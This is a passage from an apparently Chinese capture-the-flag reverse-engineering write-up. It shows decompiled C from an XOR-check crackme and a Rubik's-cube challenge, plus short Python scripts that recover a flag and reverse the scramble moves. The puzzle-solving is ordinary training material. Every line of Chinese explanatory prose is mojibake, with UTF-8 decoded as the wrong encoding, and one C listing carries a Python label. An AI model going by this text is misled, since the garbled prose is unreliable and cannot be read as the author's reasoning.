class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    printf(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printf(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">  end_m(p_argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl wuhuwuhu(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">8</span>h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦é€»è¾‘ï¼šæ¥æ”¶è¾“å…¥ç„¶åå¾ªç¯å¼‚æˆ–è¾“å…¥ï¼ˆå…ƒç´ 1å’Œå…ƒç´ 2å¼‚æˆ–çš„ç»“æœæ›¿æ¢å…ƒç´ 1ï¼‰ï¼Œç„¶åå’Œç›®æ ‡æ•°ç»„æ¯”è¾ƒï¼Œä½†æ˜¯ç›®æ ‡æ•°ç»„æ˜¯åŠ¨æ€çš„ï¼Œå› æ­¤éœ€è¦åŠ¨æ€è°ƒè¯•<br>æ‹¿åˆ°ç›®æ ‡æ•°ç»„ååè¿‡æ¥å¼‚æˆ–å°±å¯ä»¥äº†</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x17</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] = s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] ^ s[<span class="built_in">len</span>(s)<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p><h2 id="cube3"><a href="#cube3" class="headerlink" title="cube3"></a>cube3</h2><p>é¢˜ç›®æè¿°</p><ol><li>ä½ ç©è¿‡ä¸‰é˜¶é­”æ–¹å—,ä½ èƒ½çœ‹æ‡‚R U Râ€™ Uâ€™è¿™æ ·çš„å…¬å¼å—,è¿™é‡Œæœ‰4ä¸ªé­”æ–¹ç­‰ä½ æ¥è¿˜åŸ</li><li>å…¬å¼(æ­¥éª¤)æ ¼å¼ä¾‹å¦‚R Uâ€™ R U R U R Uâ€™ Râ€™ Uâ€™ R2â€™ &lt;å›è½¦&gt;,æ¯æ­¥æ“ä½œç”¨ç©ºæ ¼åˆ†å¼€,é€†æ—¶é’ˆåŠ ä¸Šâ€™å­—ç¬¦</li><li>flagæ ¼å¼ä¸ºxsctf{formula},å…¶ä¸­formulaä¸º4ä¸ªé­”æ–¹çš„è¿˜åŸæ­¥éª¤ä¾æ¬¡è¿åœ¨ä¸€èµ·,å»æ‰ç©ºæ ¼,å–å…¶md5</li><li>æœ¬é¢˜åœ¨Ubuntu22ä¸‹ç¼–è¯‘,è¯·ä¸è¦ä½¿ç”¨ubuntu18<blockquote><p>6ä¸ªé¢ï¼Œä¸€å…±24ç§æ—‹è½¬æ“ä½œï¼Œåˆ†ææ—¶éœ€è¦å¯¹å·å…¥åº§</p></blockquote></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-3B5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-3B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-3B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+B0h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">160</span>]; <span class="comment">// [rsp+150h] [rbp-270h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">114</span>]; <span class="comment">// [rsp+1F0h] [rbp-1D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+3B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cube_init((__int64)v9);</span><br><span class="line">  print_menu(v9, argv);</span><br><span class="line">  v4 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="string">&#x27;0&#x27;</span> || v4 &gt; <span class="number">52</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">53</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    formula_get_by_id((__int64)v6, v4 - <span class="number">48</span>);</span><br><span class="line">    cube_scramble((__int64)v9, (__int64)v6);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    formula_input((<span class="keyword">char</span> *)v7);</span><br><span class="line">    <span class="keyword">while</span> ( v7[v5] != <span class="number">24</span> )</span><br><span class="line">      cube_rotating((__int64)v9, v7[v5++]);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    formula_reverse(v7, v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!But not reverse!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!You reversed the formula!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;press anykey to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">~$ .&#x2F;cube3</span><br><span class="line">                           ä¸‰é˜¶é­”æ–¹</span><br><span class="line">        _______________________________________________</span><br><span class="line">        |                                             |</span><br><span class="line">        |        è¯·è¾“å…¥ç¼–å·:                           |</span><br><span class="line">        |       1.æ‰“ä¹±1     2.æ‰“ä¹±2                    |</span><br><span class="line">        |       3.æ‰“ä¹±3     4.æ‰“ä¹±4                    |</span><br><span class="line">        |       5.é€€å‡ºç¨‹åº                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        -----------------------------------------------</span><br><span class="line">                    è¯·è¾“å…¥ç¼–å·[1&#x2F;2]:4</span><br><span class="line">                            ________________</span><br><span class="line">                            |  2 |  3 |  3 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  2 |  4 |  4 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  5 |  3 |  6 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                           &#x2F;  4 &#x2F; 5  &#x2F; 1  &#x2F;|</span><br><span class="line">                          &#x2F;____&#x2F;____&#x2F;____&#x2F; |</span><br><span class="line">                         &#x2F;  1 &#x2F;  1 &#x2F;  6 &#x2F;|3+</span><br><span class="line">                        &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;|</span><br><span class="line">                       &#x2F;  3 &#x2F;  5 &#x2F;  1 &#x2F;|1|1|</span><br><span class="line">        ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;|</span><br><span class="line">        | 1 |  5 |  5 |  2 |  4 |  6 |&#x2F;|6+1|</span><br><span class="line">        +---+----+----+----+----+----+6|&#x2F;|&#x2F;</span><br><span class="line">        | 5 |  5 |  2 |  6 |  3 |  3 |&#x2F;|6+</span><br><span class="line">        +---+----+----+----+----+----+2|&#x2F;</span><br><span class="line">        | 6 |  2 |  3 |  6 |  3 |  5 |&#x2F;</span><br><span class="line">        +---+----+----+----+----+----+</span><br><span class="line">                      |  2 |  1 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  5 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">Enter a formula and separate each step with a space</span><br><span class="line">Tip: The format of the operation is like R2 R2&#39; R</span><br><span class="line">[&#39;] represents a counterclockwise rotation</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>éœ€è¦è¾“å…¥é­”æ–¹çš„å…¬å¼<br><a href="https://zhuanlan.zhihu.com/p/396215313">ã€åˆçº§ç¯‡ã€‘ä¸‰é˜¶é­”æ–¹å…¥é—¨æ•™ç¨‹ - çŸ¥ä¹ (zhihu.com)</a></p><p>è¦è¿˜åŸé­”æ–¹ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯åç€æ‹§<br>è¦åç€æ‹§ï¼Œå°±è¦æ‰¾åˆ°æ‰“ä¹±çš„é¡ºåº</p><p>idaå¤§éƒ¨åˆ†å‡½æ•°çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼Œå¯ä»¥å‡­æ„Ÿè§‰æ‰¾åˆ°å­˜å‚¨æ‰“ä¹±é¡ºåºçš„å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">formula_get_by_id</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-294h]</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">162</span>]; <span class="comment">// [rsp+20h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x280</span>uLL);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">7</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">8</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">9</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">10</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">12</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">14</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">16</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">17</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">18</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">19</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">20</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">40</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">41</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">42</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">43</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">45</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">46</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">48</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">49</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">50</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">51</span>] = <span class="number">10</span>;</span><br><span class="line">  v4[<span class="number">52</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">53</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">54</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">55</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">56</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">57</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">58</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">59</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">60</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">80</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">81</span>] = <span class="number">15</span>;</span><br><span class="line">  v4[<span class="number">82</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">83</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">84</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">85</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">86</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">87</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">88</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">89</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">90</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">91</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">92</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">93</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">94</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">95</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">96</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">97</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">98</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">99</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">100</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">120</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">121</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">122</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">123</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">124</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">125</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">126</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">127</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">128</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">129</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">130</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">131</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">132</span>] = <span class="number">0x16</span>;</span><br><span class="line">  v4[<span class="number">134</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">135</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">136</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">137</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">138</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">139</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v4[<span class="number">140</span>] = <span class="number">0x18</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i] != <span class="number">24</span>; ++i )</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4L</span>L * i) = v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i];</span><br><span class="line">  *(_DWORD *)(<span class="number">4L</span>L * i + a1) = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºé¢˜ç›®è¯´ä¸€å…±æœ‰24ç§æ“ä½œï¼Œåˆšå¥½æ˜¯v4å…ƒç´ çš„å–å€¼èŒƒå›´-1<br>å‡ä¸€çš„åŸå› æ˜¯å› ä¸ºæœ‰å››ä¸ªé­”æ–¹ï¼Œæœ€å¤§çš„å…ƒç´ ï¼ˆ24ï¼‰çš„ä½œç”¨ç±»ä¼¼åˆ†éš”ç¬¦ï¼Œé€šè¿‡ä¸»å‡½æ•°çš„whileè¯­å¥ä¹Ÿå¯ä»¥åˆ¤æ–­å‡ºæ¥ï¼Œè€Œä¸”æ•´ä¸ªv4æ•°ç»„åˆšå¥½è¢«å€¼ä¸º24çš„å…ƒç´ åˆ†éš”æˆ4éƒ¨åˆ†ï¼Œåˆšå¥½å¯¹åº”4ä¸ªé­”æ–¹</p><p>å› æ­¤å¯ä»¥å°†è¿™äº›å…ƒç´ æå–å‡ºæ¥ï¼ˆæœ‰å‘ï¼‰ï¼Œç„¶åæ˜ å°„åˆ°å¯¹åº”çš„å…¬å¼ï¼Œå†åç€è¾“å‡ºå°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            num = i[j+<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">    ss.append(<span class="built_in">int</span>(num))</span><br><span class="line"></span><br><span class="line">rotate = [</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;U\&#x27;&#x27;</span>, <span class="string">&#x27;U2&#x27;</span>, <span class="string">&#x27;U2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D\&#x27;&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;F\&#x27;&#x27;</span>, <span class="string">&#x27;F2&#x27;</span>, <span class="string">&#x27;F2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B\&#x27;&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L\&#x27;&#x27;</span>, <span class="string">&#x27;L2&#x27;</span>, <span class="string">&#x27;L2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;R\&#x27;&#x27;</span>, <span class="string">&#x27;R2&#x27;</span>, <span class="string">&#x27;R2\&#x27;&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(rotate[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> ss[i] == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> rotate[ss[i]]:</span><br><span class="line">            print(rotate[ss[i]<span class="number">-1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(rotate[ss[i]+<span class="number">1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print()</span><br><span class="line">sss = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; 